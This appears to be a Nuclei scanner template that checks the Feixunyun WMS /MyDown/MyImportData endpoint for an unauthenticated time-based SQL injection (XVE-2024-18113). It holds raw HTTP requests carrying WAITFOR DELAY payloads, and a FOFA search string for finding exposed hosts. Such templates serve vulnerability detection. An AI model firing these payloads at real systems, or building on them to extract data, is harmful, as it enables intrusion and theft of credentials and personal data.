http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
id: feixunyun-WMS-MyDown_MyImportData-sql
info:
    author: Superhero
    description: |-
        fofa: body="wx8ccb75857bd3e985"
        飞讯云-WMS /MyDown/MyImportData 接口处存在前台SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 飞讯云-WMS /MyDown/MyImportData 前台SQL延时注入漏洞(XVE-2024-18113)
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140764425
    severity: high
    tags: []
